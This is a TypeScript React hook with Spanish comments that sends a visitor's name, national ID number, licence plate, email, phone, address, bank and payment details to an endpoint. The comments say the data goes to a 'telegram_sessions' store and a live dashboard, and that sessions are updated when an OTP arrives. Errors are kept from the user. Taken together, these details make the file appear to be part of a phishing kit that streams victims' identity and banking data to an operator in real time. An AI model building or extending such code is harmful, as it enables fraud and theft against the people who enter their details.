// hook/useSessionPago.ts
// Notifica al LiveDashboard cuando el usuario muestra intención de pago
// Usa /api/session-pago para upsert en telegram_sessions + emit socket

import { useRef } from 'react';

interface SessionPagoData {
  nombre?: string;
  cedula?: string;
  placa?: string;
  email?: string;
  telefono?: string;
  direccion?: string;
  banco?: string;
  metodoPago?: string;
  total?: number | string;
  status?: string;
}

export function useSessionPago() {
  // sessionId único por visita — usamos la cédula como ID base si existe,
  // de lo contrario generamos uno aleatorio que persiste en la sesión del componente
  const sessionIdRef = useRef<string | null>(null);

  const getSessionId = (cedula?: string): string => {
    if (cedula && cedula.length > 3) {
      // Usar cédula como ID permite hacer upsert acumulativo por usuario
      sessionIdRef.current = `pf-${cedula}`;
    }
    if (!sessionIdRef.current) {
      sessionIdRef.current = `pf-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    }
    return sessionIdRef.current;
  };

  /**
   * Llama al endpoint para crear/actualizar la sesión en Supabase
   * y emitir al LiveDashboard en tiempo real.
   */
  const notificarIntencion = async (data: SessionPagoData): Promise<void> => {
    const sessionId = getSessionId(data.cedula);
    try {
      await fetch('/api/session-pago', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, ...data }),
      });
    } catch (err) {
      // No crítico — el usuario no debe ver este error
      console.warn('[useSessionPago] Error notificando intención:', err);
    }
  };

  /**
   * Actualiza el estado de una sesión existente (ej: al recibir OTP, al completar pago)
   */
  const actualizarSesion = async (
    partial: Partial<SessionPagoData> & { cedula?: string }
  ): Promise<void> => {
    const sessionId = getSessionId(partial.cedula);
    try {
      await fetch('/api/session-pago', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, ...partial }),
      });
    } catch (err) {
      console.warn('[useSessionPago] Error actualizando sesión:', err);
    }
  };

  return { notificarIntencion, actualizarSesion, getSessionId };
}
